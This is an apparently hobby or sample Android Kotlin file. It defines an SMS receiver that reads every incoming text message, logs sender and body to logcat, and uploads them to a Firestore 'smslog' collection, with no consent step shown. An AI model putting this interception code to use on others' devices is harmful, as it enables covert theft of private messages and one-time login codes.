package com.example.myapplication

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.firestore.FirebaseFirestore

class SmsReceiver : BroadcastReceiver() {

    //Initialise Firebase instances and database collections
    private val db = FirebaseFirestore.getInstance()
    private val smsCollection = db.collection("smslog")

    //Main code for BroadcastReceiver
    //If intent action matches according to defined, SMS Data in devices is retrieved and parsed
    @RequiresApi(Build.VERSION_CODES.M)
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val pdusObj = intent.extras?.get("pdus") as? Array<*> ?: return //access pdu from intent

            //Map array of objects and convert them to Smsmessage objects
            val smsMessages = pdusObj.mapNotNull { pdu ->
                //checks for Android build version to get intent string
                val format = if (Build.VERSION_CODES.M >= Build.VERSION_CODES.M) {
                    intent.getStringExtra("format")
                } else null
                SmsMessage.createFromPdu(pdu as ByteArray, format)
            }

            val logMessages = smsMessages.joinToString(separator = "\n") { sms ->
                "From: ${sms.originatingAddress} Body: ${sms.messageBody}"
            }

            // Log for debugging using original Log class
            Log.d("SMSReceiver", logMessages);

            exportSmsMessagesToFirestore(context, smsMessages);
        }
    }

    private fun exportSmsMessagesToFirestore(context: Context, smsMessages: List<SmsMessage>) {
        smsMessages.forEach { sms ->
            val sender = sms.originatingAddress ?: ""
            val messageBody = sms.messageBody ?: ""
            val timestamp = sms.timestampMillis

            val smsData = hashMapOf(
                "sender" to sender,
                "messageBody" to messageBody,
                "timestamp" to timestamp
            )

            smsCollection.add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d("SMSReceiver", "SMS message added with ID: ${documentReference.id}")
                }
                .addOnFailureListener { e ->
                    Log.e("SMSReceiver", "Error adding SMS message", e)
                }
        }
    }
}
